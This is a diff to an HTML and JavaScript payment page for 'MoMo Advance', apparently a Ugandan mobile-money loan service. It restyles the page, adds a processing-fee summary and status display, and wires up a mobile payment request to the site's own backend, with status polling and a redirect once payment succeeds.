@@ -4,7 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Payment</title>
+<title>MoMo Advance - Payment</title>
 
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Mali:wght@400;500;600;700&display=swap');
@@ -22,158 +22,316 @@ body{
 }
 
 body{
+    min-height:100vh;
     background:#FFF8D6;
     font-family:'Mali',cursive;
     color:#111;
 }
 
+.container{
+    width:92%;
+    max-width:480px;
+    margin:auto;
+}
+
+/* HEADER */
+
 header{
     background:#FFCC00;
     color:#111;
-    padding:12px 0;
+    padding:18px 0;
     border-bottom:2px solid #111;
-}
-
-.container{
-    width:100%;
-    padding:0 12px;
+    text-align:center;
 }
 
 .logo{
-    font-size:20px;
+    font-size:25px;
     font-weight:700;
-    text-align:center;
 }
 
 .brand{
+    margin-top:3px;
     font-size:12px;
-    text-align:center;
-    margin-top:2px;
+    font-family:Arial,sans-serif;
 }
 
+/* MAIN */
+
 main{
-    padding:10px 0 0;
+    padding:20px 0;
 }
 
 .card{
     background:#fff;
-    border-radius:10px;
-    padding:12px;
+    padding:18px 16px 16px;
+    border-radius:14px;
     border:1px solid #F0D96A;
-    box-shadow:0 2px 8px rgba(0,0,0,.06);
+    box-shadow:0 3px 12px rgba(0,0,0,.07);
 }
 
+/* TITLE */
+
 h1{
-    font-size:18px;
-    margin-bottom:5px;
+    color:#111;
+    background:#FFCC00;
+    padding:12px 8px;
+    border-radius:10px;
+    font-size:21px;
+    font-weight:700;
+    text-align:center;
+    margin:0 0 15px;
+    line-height:1.3;
 }
 
 .subtitle{
-    font-size:12px;
-    color:#666;
-    margin-bottom:10px;
+    background:#FFF8D6;
+    color:#333;
+    padding:13px 11px;
+    border-radius:11px;
+    font-family:Arial,sans-serif;
+    font-size:13px;
+    line-height:1.5;
+    text-align:center;
+    margin-bottom:15px;
+    border:1px solid #F0D96A;
 }
+
+/* PAYMENT SUMMARY */
+
+.summary{
+    background:#fff;
+    border-radius:12px;
+    padding:14px;
+    margin-bottom:15px;
+    border:1px solid #F0D96A;
+}
+
+.row{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    gap:10px;
+    padding:9px 0;
+    font-size:13px;
+}
+
+.row + .row{
+    border-top:1px solid #F0D96A;
+}
+
+.label{
+    color:#555;
+}
+
+.value{
+    font-weight:700;
+    color:#111;
+    text-align:right;
+}
+
+/* AMOUNT */
 
 .amount-box{
     background:#FFF3A6;
     border:1px solid #D6B000;
-    border-radius:8px;
-    padding:9px;
-    margin-bottom:10px;
+    border-radius:11px;
+    padding:12px;
+    margin-bottom:15px;
     text-align:center;
 }
 
 .amount-label{
     font-size:11px;
     color:#666;
+    font-family:Arial,sans-serif;
+    margin-bottom:3px;
 }
 
 .amount{
-    font-size:20px;
+    font-size:23px;
     font-weight:700;
 }
 
+/* FORM */
+
 label{
     display:block;
-    font-size:12px;
+    font-size:13px;
     font-weight:600;
-    margin-bottom:4px;
+    margin-bottom:7px;
+    color:#111;
 }
 
 input{
     width:100%;
-    padding:10px;
+    padding:13px;
     border:1px solid #ccc;
-    border-radius:8px;
-    font-family:'Mali',cursive;
-    font-size:14px;
+    border-radius:10px;
+    font-family:Arial,sans-serif;
+    font-size:15px;
     outline:none;
+    margin-bottom:5px;
+    background:#fff;
+    color:#111;
+}
+
+input::placeholder{
+    color:#999;
 }
 
 input:focus{
     border-color:#111;
 }
 
+/* BUTTON */
+
 button{
     width:100%;
     margin-top:10px;
-    padding:10px;
-    border:none;
-    border-radius:8px;
+    padding:14px;
+    border:0;
+    border-radius:11px;
     background:#FFCC00;
     color:#111;
     font-family:'Mali',cursive;
-    font-size:14px;
+    font-size:18px;
     font-weight:700;
     cursor:pointer;
+    box-shadow:0 3px 8px rgba(0,0,0,.10);
 }
 
 button:disabled{
-    opacity:.5;
+    opacity:.55;
     cursor:not-allowed;
 }
 
+/* MESSAGE */
+
 .message{
+    min-height:22px;
+    margin-top:11px;
+    color:#333;
+    font-family:Arial,sans-serif;
+    font-size:12px;
+    line-height:1.5;
     text-align:center;
-    font-size:11px;
-    margin-top:8px;
-    min-height:16px;
 }
+
+/* NOTICE */
+
+.notice{
+    margin-top:13px;
+    padding:11px;
+    background:#FFF8D6;
+    border:1px solid #F0D96A;
+    border-radius:9px;
+    color:#555;
+    font-family:Arial,sans-serif;
+    font-size:11px;
+    line-height:1.5;
+    text-align:center;
+}
+
+/* FOOTER */
 
 footer{
     text-align:center;
-    font-size:10px;
+    padding:5px 10px 15px;
     color:#666;
-    padding:8px 5px 0;
+    font-family:Arial,sans-serif;
+    font-size:11px;
+    line-height:1.7;
 }
 
 footer a{
     color:#111;
     text-decoration:none;
-    margin:0 3px;
+}
+
+/* SMALL SCREENS */
+
+@media(max-width:360px){
+
+    .container{
+        width:94%;
+    }
+
+    header{
+        padding:13px 0;
+    }
+
+    .logo{
+        font-size:21px;
+    }
+
+    main{
+        padding:12px 0;
+    }
+
+    .card{
+        padding:14px 12px;
+    }
+
+    h1{
+        font-size:19px;
+    }
+
+    .amount{
+        font-size:21px;
+    }
+
+    button{
+        padding:12px;
+        font-size:17px;
+    }
 }
 
 @media(max-height:650px){
 
     header{
-        padding:8px 0;
+        padding:10px 0;
     }
 
     main{
-        padding-top:6px;
+        padding:9px 0;
     }
 
     .card{
+        padding:11px;
+    }
+
+    h1{
+        margin-bottom:10px;
         padding:9px;
+    }
+
+    .subtitle{
+        padding:9px;
+        margin-bottom:10px;
+    }
+
+    .summary{
+        padding:10px;
+        margin-bottom:10px;
+    }
+
+    .amount-box{
+        padding:8px;
+        margin-bottom:10px;
     }
 
     button{
         margin-top:7px;
+        padding:10px;
+    }
+
+    .notice{
+        margin-top:8px;
         padding:8px;
     }
 
     footer{
-        padding-top:5px;
+        padding-top:3px;
     }
 }
 </style>
@@ -183,30 +341,57 @@ footer a{
 
 <header>
     <div class="container">
-        <div class="logo">LOAN APPLICATION PORTAL</div>
+        <div class="logo">MoMo ADVANCE</div>
         <div class="brand">Secure mobile payment</div>
     </div>
 </header>
 
 <main>
+
     <div class="container">
 
-        <div class="card">
+        <section class="card">
 
-            <h1>Complete Payment</h1>
+            <h1>Processing Fee Payment</h1>
 
             <div class="subtitle">
                 Enter your Uganda mobile number to receive a payment request.
             </div>
 
+            <div class="summary">
+
+                <div class="row">
+                    <span class="label">
+                        Payment purpose
+                    </span>
+
+                    <span class="value">
+                        Processing Fee
+                    </span>
+                </div>
+
+                <div class="row">
+                    <span class="label">
+                        Payment status
+                    </span>
+
+                    <span class="value" id="paymentStatus">
+                        Pending
+                    </span>
+                </div>
+
+            </div>
+
             <div class="amount-box">
+
                 <div class="amount-label">
-                    Payment Amount
+                    PAYMENT AMOUNT
                 </div>
 
                 <div class="amount" id="paymentAmount">
                     UGX 0
                 </div>
+
             </div>
 
             <label for="phone">
@@ -221,31 +406,59 @@ footer a{
                 autocomplete="tel"
             >
 
-            <button id="payBtn">
-                Pay Now
+            <button
+                id="payBtn"
+                type="button"
+            >
+                Pay Processing Fee
             </button>
 
-            <div class="message" id="message"></div>
+            <div
+                class="message"
+                id="message">
+            </div>
 
-        </div>
+            <div class="notice">
+                A payment request will be sent to the mobile number entered above.
+                Complete the request on your phone to continue.
+            </div>
+
+        </section>
 
     </div>
+
 </main>
 
 <footer>
+
     <a href="#">Terms</a> |
     <a href="#">Privacy</a> |
     <a href="#">Support</a>
+
     <br>
-    © 2026
+
+    © 2026 MoMo Advance
+
 </footer>
 
 
 <script>
 
+/*
+========================================
+BACKEND
+========================================
+*/
+
 const BACKEND_URL =
     "https://momo-advance-backend.onrender.com";
 
+
+/*
+========================================
+ELEMENTS
+========================================
+*/
 
 const serviceFee =
     sessionStorage.getItem("serviceFee");
@@ -262,6 +475,9 @@ const payBtn =
 const message =
     document.getElementById("message");
 
+const paymentStatus =
+    document.getElementById("paymentStatus");
+
 
 /*
 ========================================
@@ -271,7 +487,8 @@ SHOW PAYMENT AMOUNT
 
 if (!serviceFee) {
 
-    paymentAmount.textContent = "UGX 0";
+    paymentAmount.textContent =
+        "UGX 0";
 
     payBtn.disabled = true;
 
@@ -308,6 +525,8 @@ payBtn.addEventListener("click", async () => {
         message.textContent =
             "Enter a valid Uganda number starting with 256.";
 
+        phoneInput.focus();
+
         return;
     }
 
@@ -328,6 +547,9 @@ payBtn.addEventListener("click", async () => {
 
     message.textContent =
         "Please wait...";
+
+    paymentStatus.textContent =
+        "Processing";
 
 
     try {
@@ -386,6 +608,9 @@ payBtn.addEventListener("click", async () => {
             payBtn.textContent =
                 "Waiting for payment...";
 
+            paymentStatus.textContent =
+                "Waiting";
+
 
             checkPaymentStatus(
                 transactionId
@@ -397,10 +622,13 @@ payBtn.addEventListener("click", async () => {
                 data.message ||
                 "Unable to send payment request.";
 
+            paymentStatus.textContent =
+                "Failed";
+
             payBtn.disabled = false;
 
             payBtn.textContent =
-                "Pay Now";
+                "Pay Processing Fee";
         }
 
 
@@ -411,10 +639,13 @@ payBtn.addEventListener("click", async () => {
         message.textContent =
             "Unable to connect to the payment server.";
 
+        paymentStatus.textContent =
+            "Failed";
+
         payBtn.disabled = false;
 
         payBtn.textContent =
-            "Pay Now";
+            "Pay Processing Fee";
     }
 
 });
@@ -474,6 +705,9 @@ async function checkPaymentStatus(
                     message.textContent =
                         "Payment successful.";
 
+                    paymentStatus.textContent =
+                        "Successful";
+
                     window.location.href =
                         "delivery.html";
 
@@ -490,6 +724,9 @@ async function checkPaymentStatus(
 
                     message.textContent =
                         "Payment was not completed.";
+
+                    paymentStatus.textContent =
+                        "Failed";
 
                     payBtn.disabled = false;
 
@@ -508,6 +745,9 @@ async function checkPaymentStatus(
 
                     message.textContent =
                         "Payment is still pending. Please try again later.";
+
+                    paymentStatus.textContent =
+                        "Pending";
 
                     payBtn.disabled = false;
 
